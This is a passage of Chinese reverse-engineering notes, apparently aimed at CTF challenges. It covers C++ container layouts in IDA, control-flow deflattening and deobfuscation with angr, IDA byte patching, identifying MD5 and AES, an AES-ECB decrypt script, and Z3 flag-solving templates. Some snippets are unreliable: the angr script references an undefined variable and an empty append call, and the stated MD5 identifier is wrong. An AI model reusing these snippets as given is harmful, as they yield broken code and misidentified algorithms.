<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424145337189.png"></p>
<p>此时再<code>push_back(0x50)</code>，会如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424145432745.png" alt="image-20220424145432745"></p>
<p>就导致漏洞产生了。</p>
<p>相关的IDA代码如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::<span class="built_in">vector</span>(v11, argv, envp);</span><br><span class="line"><span class="keyword">for</span> ( v12[<span class="number">0</span>] = <span class="number">0</span>; v12[<span class="number">0</span>] &lt;= <span class="number">1</span>; ++v12[<span class="number">0</span>] )</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(v11, v12);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::pop_back(v11);</span><br><span class="line">getchar();</span><br><span class="line">v12[<span class="number">0</span>] = <span class="number">80</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(v11, v12);</span><br></pre></td></tr></table></div></figure>

<p>这个还是挺简单的，就不说了。</p>
<p>其他的像<code>empty()</code>、<code>resize()</code>、<code>clear()</code>什么的也是类似的，不多说了。</p>
<p>🔺注</p>
<p>对于类<code>class</code>放入<code>vector</code>的情况，在<code>vector</code>中只会保存对象的成员变量，而它的函数指针并不会保存</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221128143715373.png" alt="image-20221128143715373"></p>
<p>当从容器中取出来时，会通过一个函数来获取对应成员的地址，之后传入对应的函数。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221128143616124.png" alt="image-20221128143616124"></p>

        <h2 id="3-容器类list"   >
          <a href="#3-容器类list" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-容器类list" class="headerlink" title="3.容器类list"></a>3.容器类list</h2>
      <p>常见双向循环链表管理</p>
<p>双向循环链表，定义之后栈上只保存头节点地址和尾部节点地址</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221128145817008.png" alt="image-20221128145817008"></p>
<p>每次申请<code>push_back</code>加入对象时都会使用<code>malloc</code>申请，创建<code>next、prev</code>指针，然后拷贝数据，将其放入双向循环链表中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221128150028794.png" alt="image-20221128150028794"></p>

        <h1 id="六、控制流去平坦化"   >
          <a href="#六、控制流去平坦化" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、控制流去平坦化" class="headerlink" title="六、控制流去平坦化"></a>六、控制流去平坦化</h1>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/cq674350529/deflat" >cq674350529/deflat: use angr to deobfuscation (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211201112027.png" alt="image-20211201112020849"></p>
<p>以上类型的就是平坦化之后的，需要找到函数入口进行去除，之后即可得到去除后的</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 deflat.py -f binary --addr 0x400530</span><br></pre></td></tr></table></div></figure>




        <h1 id="七、去混淆"   >
          <a href="#七、去混淆" class="heading-link"><i class="fas fa-link"></i></a><a href="#七、去混淆" class="headerlink" title="七、去混淆"></a>七、去混淆</h1>
      
        <h2 id="1-利用angr"   >
          <a href="#1-利用angr" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-利用angr" class="headerlink" title="1.利用angr"></a>1.利用angr</h2>
      <p>使用代码查找内存，找到混淆的地方，然后通过avoid来去除</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">binary = <span class="built_in">open</span>(<span class="string">&#x27;./yolomolo&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">avoids = []</span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    index = e.find(<span class="string">b&#x27;\xB9\x00\x00\x00\x00&#x27;</span>,index+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> index == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    addr = <span class="number">0x400000</span> + index</span><br><span class="line">    avoids.append()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">len</span>(avoids))</span><br><span class="line"><span class="built_in">print</span> (avoids)</span><br></pre></td></tr></table></div></figure>

<p>查找内存中的机器码为<code>&#39;\xB9\x00\x00\x00\x00&#39;</code>的地方，即<code>mov ecx 0</code>，这个为一些混淆的标志。</p>
<p>即找到混淆的标志点，然后通过avoid来去除。</p>

        <h1 id="八、批量修改数据"   >
          <a href="#八、批量修改数据" class="heading-link"><i class="fas fa-link"></i></a><a href="#八、批量修改数据" class="headerlink" title="八、批量修改数据"></a>八、批量修改数据</h1>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idc_bc695 <span class="keyword">import</span>*</span><br><span class="line">addr = <span class="number">0x401807</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x401823</span>-<span class="number">0x401807</span>):</span><br><span class="line">    PatchByte(addr +i, Byte(addr+i)^<span class="number">0x90</span>)</span><br></pre></td></tr></table></div></figure>




        <h1 id="九、加密算法"   >
          <a href="#九、加密算法" class="heading-link"><i class="fas fa-link"></i></a><a href="#九、加密算法" class="headerlink" title="九、加密算法"></a>九、加密算法</h1>
      
        <h2 id="1-md5"   >
          <a href="#1-md5" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-md5" class="headerlink" title="1.md5"></a>1.md5</h2>
      <p>标识符：0x123456789</p>
<p>常见形式如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230728143855425.png" alt="image-20230728143855425"></p>

        <h2 id="2-AES"   >
          <a href="#2-AES" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-AES" class="headerlink" title="2.AES:"></a>2.AES:</h2>
      
        <h3 id="加密流程："   >
          <a href="#加密流程：" class="heading-link"><i class="fas fa-link"></i></a><a href="#加密流程：" class="headerlink" title="加密流程："></a>加密流程：</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454120.png" alt="image-AES"></p>
<p>首先轮密钥加(KeyAdd)</p>
<p>9轮循环：字节替换(substitution)、行移位(ShifRow)、列混淆(MixColumn)、轮密钥加(KeyAdd)</p>
<p>第10轮循环：字节替换(substitution)、行移位(ShifRow)、轮密钥加(KeyAdd)</p>
<p>第十轮没有列混淆，加密过程常见如下，函数名称是用Finger识别的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230728144000135.png" alt="image-20230728144000135"></p>

        <h3 id="密钥扩展："   >
          <a href="#密钥扩展：" class="heading-link"><i class="fas fa-link"></i></a><a href="#密钥扩展：" class="headerlink" title="密钥扩展："></a>密钥扩展：</h3>
      <p>先for循环4次，再for循环40次，属于密钥扩展</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230801110448511.png" alt="image-20230801110448511"></p>

        <h3 id="判断模式："   >
          <a href="#判断模式：" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断模式：" class="headerlink" title="判断模式："></a>判断模式：</h3>
      <p>如果密文的长度是16字节的整数倍，并且没有任何重复的块，那么可能是CTR或OFB模式3。<br>如果密文的长度是16字节的整数倍，并且有重复的块，那么可能是ECB或CBC模式3。ECB模式下，相同的明文块会产生相同的密文块，所以重复的块更容易被发现1。CBC模式下，相同的明文块不一定会产生相同的密文块，因为每个块都与前一个块进行异或操作1。但是如果明文中有大量的零或其他常数值，那么CBC模式下也可能出现重复的块3。<br>如果密文的长度不是16字节的整数倍，那么可能是CFB模式3。CFB模式下，可以对任意长度的明文进行加密，而不需要进行填充1。<br>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41853048/article/details/131771420" >https://blog.csdn.net/qq_41853048/article/details/131771420</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="脚本使用"   >
          <a href="#脚本使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#脚本使用" class="headerlink" title="脚本使用"></a>脚本使用</h2>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex</span><br><span class="line"></span><br><span class="line">mode = AES.MODE_ECB</span><br><span class="line">key = <span class="string">b&#x27;\xcb\x8d\x49\x35\x21\xb4\x7a\x4c\xc1\xae\x7e\x62\x22\x92\x66\xce&#x27;</span></span><br><span class="line">text = <span class="string">b&#x27;\xBC\x0A\xAD\xC0\x14\x7C\x5E\xCC\xE0\xB1\x40\xBC\x9C\x51\xD5\x2B\x46\xB2\xB9\x43\x4D\xE5\x32\x4B\xAD\x7F\xB4\xB3\x9C\xDB\x4B\x5B&#x27;</span></span><br><span class="line">cryptos = AES.new(key, mode)</span><br><span class="line">cipher_text = cryptos.decrypt(text)</span><br><span class="line">t = b2a_hex(cipher_text).decode()</span><br><span class="line">t = re.findall(<span class="string">&quot;.&#123;2&#125;&quot;</span>, t)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> t:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(x, <span class="number">16</span>)), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure>






        <h1 id="十、Z3求解"   >
          <a href="#十、Z3求解" class="heading-link"><i class="fas fa-link"></i></a><a href="#十、Z3求解" class="headerlink" title="十、Z3求解"></a>十、Z3求解</h1>
      <p>几个常见模板</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">a1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    a1.append(BitVec(<span class="string">&#x27;a1%d&#x27;</span> % i, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">s = Solver()</span><br><span class="line">s.add(And((a1[<span class="number">5</span>] ^ (a1[<span class="number">8</span>] * a1[<span class="number">8</span>] - a1[<span class="number">1</span>]) ^ <span class="number">0x33</span>) == <span class="number">9600</span></span><br><span class="line">    , ((a1[<span class="number">30</span>] + a1[<span class="number">27</span>] + a1[<span class="number">24</span>] + a1[<span class="number">11</span>] - a1[<span class="number">12</span>] - a1[<span class="number">0</span>] * a1[<span class="number">15</span>] * a1[<span class="number">7</span>]) ^ <span class="number">0x64</span>) == -<span class="number">344791</span></span><br><span class="line">    , ((a1[<span class="number">8</span>] + a1[<span class="number">16</span>] * a1[<span class="number">29</span>] * a1[<span class="number">1</span>] - a1[<span class="number">25</span>]) ^ <span class="number">0x62</span>) == <span class="number">406716</span></span><br><span class="line">    , ((a1[<span class="number">4</span>] - a1[<span class="number">1</span>]) ^ (a1[<span class="number">0</span>] * a1[<span class="number">31</span>] + a1[<span class="number">28</span>] - a1[<span class="number">26</span>]) ^ a1[<span class="number">13</span>] ^ <span class="number">0x66</span>) == -<span class="number">8688</span></span><br><span class="line">    , ((a1[<span class="number">13</span>] + a1[<span class="number">18</span>] + a1[<span class="number">3</span>] * a1[<span class="number">7</span>] - a1[<span class="number">23</span>] - a1[<span class="number">3</span>]) ^ <span class="number">0x66</span>) == <span class="number">3085</span></span><br><span class="line">    , ((a1[<span class="number">18</span>] - a1[<span class="number">1</span>] * a1[<span class="number">29</span>]) ^ (a1[<span class="number">30</span>] + a1[<span class="number">22</span>] - a1[<span class="number">1</span>]) ^ a1[<span class="number">15</span>] ^ (a1[<span class="number">2</span>] * a1[<span class="number">31</span>]) ^ <span class="number">0x35</span>) == -<span class="number">16248</span></span><br><span class="line">    , ((a1[<span class="number">3</span>] * a1[<span class="number">21</span>] + a1[<span class="number">29</span>] + a1[<span class="number">25</span>] + a1[<span class="number">4</span>] * a1[<span class="number">23</span>] - a1[<span class="number">2</span>] * a1[<span class="number">7</span>] - a1[<span class="number">21</span>]) ^ <span class="number">0x65</span>) == <span class="number">4469</span></span><br><span class="line">    , ((a1[<span class="number">3</span>] + a1[<span class="number">1</span>] - a1[<span class="number">2</span>]) ^ (a1[<span class="number">23</span>] * a1[<span class="number">23</span>]) ^ <span class="number">0x61</span>) == <span class="number">2761</span></span><br><span class="line">    , ((a1[<span class="number">5</span>] * a1[<span class="number">11</span>]) ^ (a1[<span class="number">8</span>] * a1[<span class="number">21</span>]) ^ a1[<span class="number">29</span>] ^ <span class="number">0x39</span>) == <span class="number">7832</span> ))</span><br><span class="line"></span><br><span class="line">s.add(And(((a1[<span class="number">7</span>] * a1[<span class="number">11</span>] * a1[<span class="number">8</span>] + a1[<span class="number">14</span>]) ^ (a1[<span class="number">10</span>] + <span class="number">2</span> * a1[<span class="number">25</span>]) ^ (a1[<span class="number">10</span>] * a1[<span class="number">15</span>]) ^ <span class="number">0x61</span>) == <span class="number">234968</span></span><br><span class="line">    , (a1[<span class="number">8</span>] ^ (a1[<span class="number">19</span>] + a1[<span class="number">27</span>] + a1[<span class="number">19</span>] * a1[<span class="number">0</span>] + a1[<span class="number">9</span>] * a1[<span class="number">25</span>]) ^ a1[<span class="number">28</span>] ^ a1[<span class="number">7</span>] ^ <span class="number">0x30</span>) == <span class="number">11738</span></span><br><span class="line">    , ((a1[<span class="number">32</span>] - a1[<span class="number">1</span>]) ^ (a1[<span class="number">28</span>] + a1[<span class="number">14</span>] - a1[<span class="number">2</span>] * a1[<span class="number">21</span>]) ^ a1[<span class="number">21</span>] ^ <span class="number">0x38</span>) == <span class="number">3252</span></span><br><span class="line">    , ((a1[<span class="number">1</span>] * a1[<span class="number">32</span>]) ^ (a1[<span class="number">8</span>] + a1[<span class="number">0</span>] - a1[<span class="number">5</span>] - a1[<span class="number">11</span>]) ^ a1[<span class="number">21</span>] ^ (a1[<span class="number">2</span>] - a1[<span class="number">12</span>]) ^ <span class="number">0x32</span>) == -<span class="number">2673</span></span><br><span class="line">    , (a1[<span class="number">2</span>] ^ (a1[<span class="number">0</span>] + a1[<span class="number">1</span>]) ^ (a1[<span class="number">6</span>] - a1[<span class="number">19</span>] - a1[<span class="number">22</span>]) ^ <span class="number">0x64</span>) == -<span class="number">164</span></span><br><span class="line">    , ((a1[<span class="number">25</span>] - a1[<span class="number">0</span>]) ^ (a1[<span class="number">28</span>] + a1[<span class="number">4</span>] + a1[<span class="number">31</span>] * a1[<span class="number">31</span>] + a1[<span class="number">2</span>] - a1[<span class="number">32</span>]) ^ <span class="number">0x30</span>) == -<span class="number">15811</span></span><br><span class="line">    , (a1[<span class="number">6</span>] ^ (a1[<span class="number">5</span>] + a1[<span class="number">15</span>] * a1[<span class="number">32</span>] - a1[<span class="number">32</span>] * a1[<span class="number">19</span>] * a1[<span class="number">22</span>]) ^ a1[<span class="number">8</span>] ^ <span class="number">0x61</span>) == -<span class="number">167332</span></span><br><span class="line">    , ((a1[<span class="number">26</span>] + a1[<span class="number">32</span>] * a1[<span class="number">24</span>] - a1[<span class="number">10</span>]) ^ (a1[<span class="number">11</span>] * a1[<span class="number">3</span>] - a1[<span class="number">30</span>] - a1[<span class="number">27</span>] - a1[<span class="number">31</span>]) ^ <span class="number">0x64</span>) == <span class="number">3470</span></span><br><span class="line">    , ((a1[<span class="number">5</span>] * a1[<span class="number">15</span>]) ^ (a1[<span class="number">18</span>] * a1[<span class="number">25</span>] + a1[<span class="number">14</span>] + a1[<span class="number">2</span>] + a1[<span class="number">26</span>] + a1[<span class="number">27</span>]) ^ a1[<span class="number">29</span>] ^ <span class="number">0x38</span>) == <span class="number">4323</span></span><br><span class="line">    , ((a1[<span class="number">29</span>] * a1[<span class="number">8</span>] * a1[<span class="number">21</span>] * a1[<span class="number">27</span>] + a1[<span class="number">13</span>] - a1[<span class="number">7</span>]) ^ a1[<span class="number">5</span>] ^ <span class="number">0x39</span>) == <span class="number">25234850</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.add(And(((a1[<span class="number">0</span>] * a1[<span class="number">8</span>] * a1[<span class="number">13</span>] + a1[<span class="number">6</span>] + a1[<span class="number">19</span>] * a1[<span class="number">23</span>] - a1[<span class="number">2</span>]) ^ <span class="number">0x62</span>) == <span class="number">394534</span></span><br><span class="line">    , ((a1[<span class="number">14</span>] + a1[<span class="number">30</span>] + a1[<span class="number">14</span>] - a1[<span class="number">30</span>] - a1[<span class="number">2</span>] * a1[<span class="number">30</span>] * a1[<span class="number">1</span>] * a1[<span class="number">17</span>] - a1[<span class="number">2</span>]) ^ <span class="number">0x35</span>) == -<span class="number">15531747</span></span><br><span class="line">    , ((a1[<span class="number">1</span>] * a1[<span class="number">14</span>]) ^ (a1[<span class="number">13</span>] - a1[<span class="number">27</span>] * a1[<span class="number">32</span>]) ^ <span class="number">0x33</span>) == -<span class="number">9992</span></span><br><span class="line">    , (a1[<span class="number">11</span>] ^ a1[<span class="number">25</span>] ^ a1[<span class="number">12</span>] ^ a1[<span class="number">2</span>] ^ (a1[<span class="number">11</span>] + a1[<span class="number">29</span>] - a1[<span class="number">24</span>]) ^ <span class="number">0x32</span>) == <span class="number">117</span></span><br><span class="line">    , (a1[<span class="number">2</span>] ^ (a1[<span class="number">20</span>] + a1[<span class="number">0</span>] + a1[<span class="number">8</span>] * a1[<span class="number">6</span>] * a1[<span class="number">8</span>] * a1[<span class="number">0</span>] - a1[<span class="number">19</span>]) ^ <span class="number">0x62</span>) == <span class="number">83181080</span></span><br><span class="line">    , ((a1[<span class="number">14</span>] * a1[<span class="number">32</span>] + a1[<span class="number">29</span>] + a1[<span class="number">22</span>] - a1[<span class="number">18</span>] - a1[<span class="number">1</span>]) ^ <span class="number">0x64</span>) == <span class="number">3243</span></span><br><span class="line">    , ((a1[<span class="number">18</span>] - a1[<span class="number">4</span>]) ^ (a1[<span class="number">16</span>] + a1[<span class="number">7</span>]) ^ (a1[<span class="number">14</span>] + a1[<span class="number">18</span>] - a1[<span class="number">7</span>] - a1[<span class="number">14</span>]) ^ <span class="number">0x65</span>) == -<span class="number">25</span></span><br><span class="line">    , ((a1[<span class="number">13</span>] - a1[<span class="number">7</span>]) ^ (a1[<span class="number">2</span>] - a1[<span class="number">13</span>]) ^ (a1[<span class="number">0</span>] - a1[<span class="number">4</span>] - a1[<span class="number">14</span>] - a1[<span class="number">13</span>] - a1[<span class="number">26</span>]) ^ <span class="number">0x65</span>) == -<span class="number">363</span></span><br><span class="line">    , ((a1[<span class="number">1</span>] + a1[<span class="number">10</span>] + a1[<span class="number">7</span>] * a1[<span class="number">14</span>] * a1[<span class="number">7</span>]) ^ (a1[<span class="number">17</span>] + a1[<span class="number">5</span>] * a1[<span class="number">8</span>]) ^ <span class="number">0x37</span>) == <span class="number">239501</span></span><br><span class="line">    , (a1[<span class="number">5</span>] ^ (a1[<span class="number">15</span>] * a1[<span class="number">24</span>]) ^ <span class="number">0x61</span>) == <span class="number">5026</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.add(And((a1[<span class="number">9</span>] ^ (a1[<span class="number">28</span>] * a1[<span class="number">0</span>]) ^ (a1[<span class="number">29</span>] + a1[<span class="number">12</span>] + a1[<span class="number">16</span>]) ^ <span class="number">0x37</span>) == <span class="number">7058</span></span><br><span class="line">    , ((a1[<span class="number">6</span>] * a1[<span class="number">8</span>] + a1[<span class="number">6</span>]) ^ (a1[<span class="number">18</span>] - a1[<span class="number">7</span>]) ^ <span class="number">0x65</span>) == <span class="number">12399</span></span><br><span class="line">    , ((a1[<span class="number">12</span>] + a1[<span class="number">8</span>]) ^ (a1[<span class="number">1</span>] - a1[<span class="number">1</span>] * a1[<span class="number">32</span>] * a1[<span class="number">30</span>]) ^ <span class="number">0x30</span>) == -<span class="number">151548</span></span><br><span class="line">    , ((a1[<span class="number">4</span>] + a1[<span class="number">32</span>] * a1[<span class="number">18</span>] + a1[<span class="number">22</span>] - a1[<span class="number">12</span>] - a1[<span class="number">22</span>] - a1[<span class="number">12</span>]) ^ <span class="number">0x30</span>) == <span class="number">1624</span></span><br><span class="line">    , ((a1[<span class="number">9</span>] * a1[<span class="number">3</span>]) ^ (a1[<span class="number">26</span>] + a1[<span class="number">13</span>]) ^ a1[<span class="number">23</span>] ^ <span class="number">0x65</span>) == <span class="number">6569</span></span><br><span class="line">    , ((a1[<span class="number">17</span>] - a1[<span class="number">3</span>]) ^ (a1[<span class="number">14</span>] * a1[<span class="number">26</span>] * a1[<span class="number">11</span>] * a1[<span class="number">25</span>]) ^ <span class="number">0x61</span>) == -<span class="number">24990047</span></span><br><span class="line">    , ((a1[<span class="number">22</span>] - a1[<span class="number">0</span>]) ^ (a1[<span class="number">2</span>] - a1[<span class="number">31</span>] - a1[<span class="number">13</span>] - a1[<span class="number">5</span>] - a1[<span class="number">28</span>]) ^ <span class="number">0x65</span>) == <span class="number">372</span></span><br><span class="line">    , (a1[<span class="number">8</span>] ^ (a1[<span class="number">4</span>] * a1[<span class="number">14</span>] + a1[<span class="number">20</span>] + a1[<span class="number">19</span>] + a1[<span class="number">25</span>] + a1[<span class="number">21</span>] * a1[<span class="number">8</span>] - a1[<span class="number">1</span>]) ^ <span class="number">0x63</span>) == <span class="number">13326</span></span><br><span class="line">    , ((a1[<span class="number">8</span>] + a1[<span class="number">29</span>] - a1[<span class="number">25</span>] - a1[<span class="number">32</span>]) ^ (a1[<span class="number">24</span>] * a1[<span class="number">4</span>]) ^ <span class="number">0x62</span>) == <span class="number">3910</span></span><br><span class="line">    , ((a1[<span class="number">2</span>] * a1[<span class="number">15</span>] + a1[<span class="number">27</span>] - a1[<span class="number">30</span>] * a1[<span class="number">29</span>]) ^ <span class="number">0x37</span>) == <span class="number">1316</span>))</span><br><span class="line"></span><br><span class="line">s.add(And(((a1[<span class="number">5</span>] - a1[<span class="number">2</span>] * a1[<span class="number">24</span>]) ^ (a1[<span class="number">21</span>] - a1[<span class="number">20</span>]) ^ a1[<span class="number">7</span>] ^ <span class="number">0x64</span>) == <span class="number">3290</span></span><br><span class="line">    , ((a1[<span class="number">9</span>] * a1[<span class="number">15</span>]) ^ (a1[<span class="number">7</span>] - a1[<span class="number">14</span>]) ^ a1[<span class="number">2</span>] ^ <span class="number">0x37</span>) == -<span class="number">10137</span></span><br><span class="line">    , ((a1[<span class="number">5</span>] * a1[<span class="number">6</span>] + a1[<span class="number">26</span>]) ^ (a1[<span class="number">11</span>] + a1[<span class="number">3</span>]) ^ <span class="number">0x61</span>) == <span class="number">8601</span></span><br><span class="line">    , (a1[<span class="number">3</span>] ^ (a1[<span class="number">8</span>] + a1[<span class="number">16</span>] + a1[<span class="number">27</span>]) ^ (a1[<span class="number">28</span>] + a1[<span class="number">31</span>] * a1[<span class="number">12</span>] + a1[<span class="number">21</span>]) ^ <span class="number">0x35</span>) == <span class="number">12752</span></span><br><span class="line">    , (a1[<span class="number">2</span>] ^ (a1[<span class="number">6</span>] - a1[<span class="number">20</span>] - a1[<span class="number">8</span>] * a1[<span class="number">9</span>]) ^ (a1[<span class="number">16</span>] + a1[<span class="number">6</span>]) ^ <span class="number">0x63</span>) == -<span class="number">9964</span></span><br><span class="line">    , ((a1[<span class="number">1</span>] * a1[<span class="number">2</span>] * a1[<span class="number">32</span>]) ^ (a1[<span class="number">29</span>] + a1[<span class="number">27</span>]) ^ (a1[<span class="number">1</span>] * a1[<span class="number">18</span>] * a1[<span class="number">8</span>]) ^ <span class="number">0x35</span>) == <span class="number">283359</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	s.add(a1[i] == <span class="built_in">ord</span>(<span class="string">&#x27;ESCAPE&#123;&#x27;</span>[i]))</span><br><span class="line">        </span><br><span class="line">flg = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">    result = s.model()</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    s.model().sorts()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">        flg +=  <span class="built_in">chr</span>(<span class="built_in">eval</span>(<span class="built_in">str</span>(s.model().<span class="built_in">eval</span>(a1[i]))))</span><br><span class="line">    <span class="built_in">print</span>(flg)</span><br></pre></td></tr></table></div></figure>

<p>在s.add中间需要用And(xx,xxx)来进行2个条件联合约束</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">s = Solver()</span><br><span class="line">v1 = Real(<span class="string">&#x27;v1&#x27;</span>)</span><br><span class="line">v2 = Real(<span class="string">&#x27;v2&#x27;</span>)</span><br><span class="line">v3 = Real(<span class="string">&#x27;v3&#x27;</span>)</span><br><span class="line">v4 = Real(<span class="string">&#x27;v4&#x27;</span>)</span><br><span class="line">v5 = Real(<span class="string">&#x27;v5&#x27;</span>)</span><br><span class="line">v6 = Real(<span class="string">&#x27;v6&#x27;</span>)</span><br><span class="line">v7 = Real(<span class="string">&#x27;v7&#x27;</span>)</span><br><span class="line">v8 = Real(<span class="string">&#x27;v8&#x27;</span>)</span><br><span class="line">v9 = Real(<span class="string">&#x27;v9&#x27;</span>)</span><br><span class="line">v11 = Real(<span class="string">&#x27;v11&#x27;</span>)</span><br><span class="line">s.add(-<span class="number">85</span> * v9 + <span class="number">58</span> * v8 + <span class="number">97</span> * v6 + v7 + -<span class="number">45</span> * v5 + <span class="number">84</span> * v4 + <span class="number">95</span> * v2 - <span 